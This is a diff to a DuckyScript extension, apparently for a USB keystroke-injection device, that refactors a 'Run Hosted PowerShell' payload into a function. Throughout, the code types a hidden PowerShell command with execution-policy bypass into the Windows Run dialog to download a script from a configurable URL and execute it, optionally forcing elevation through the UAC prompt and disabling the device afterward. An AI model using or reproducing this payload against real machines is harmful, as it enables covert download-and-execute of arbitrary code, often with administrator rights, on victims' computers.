@@ -2,9 +2,9 @@ EXTENSION RUN_HOSTED_POWERSHELL
     REM_BLOCK DOCUMENTATION
         Title: Run Hosted PowerShell
         Author: PlumpyTurkey
-        Description: This extension executes a hosted PowerShell script using the Windows Run dialog box.
+        Description: This extension allows you to run a hosted PowerShell script using the Windows Run dialog box.
         Target: Windows 10, 11
-        Version: 1.0
+        Version: 1.1
     END_REM
 
     REM Required options:
@@ -15,20 +15,22 @@ EXTENSION RUN_HOSTED_POWERSHELL
     DEFINE #RHP_ELEVATED_EXECUTION FALSE
     DEFINE #RHP_DISABLE_AFTER_EXECUTION FALSE
 
-    GUI r
+    FUNCTION RHP_RUN()
+        GUI r
 
-    DELAY #RHP_DELAY
-    STRING PowerShell -W H -EX Bypass "IWR -UseB '#RHP_SCRIPT_URL' | IEX"
-
-    IF_DEFINED_TRUE #RHP_ELEVATED_EXECUTION
-        CTRL SHIFT ENTER
         DELAY #RHP_DELAY
-        LEFT
-    END_IF_DEFINED
+        STRING PowerShell -W H -EX Bypass "IWR -UseB '#RHP_SCRIPT_URL' | IEX"
 
-    ENTER
+        IF_DEFINED_TRUE #RHP_ELEVATED_EXECUTION
+            CTRL SHIFT ENTER
+            DELAY #RHP_DELAY
+            LEFT
+        END_IF_DEFINED
 
-    IF_DEFINED_TRUE #RHP_DISABLE_AFTER_EXECUTION
-        ATTACKMODE OFF
-    END_IF_DEFINED
+        ENTER
+
+        IF_DEFINED_TRUE #RHP_DISABLE_AFTER_EXECUTION
+            ATTACKMODE OFF
+        END_IF_DEFINED
+    END_FUNCTION
 END_EXTENSION
